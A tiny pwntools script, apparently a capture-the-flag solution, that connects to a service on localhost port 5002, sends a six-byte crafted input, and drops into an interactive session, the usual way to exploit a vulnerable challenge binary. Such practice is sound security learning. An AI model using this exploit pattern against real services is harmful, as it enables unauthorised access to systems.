from pwn import *


p=remote("localhost" , 5002)

p.sendline(b"\xc8\x65\xff\x16\x42\xf7")


p.interactive()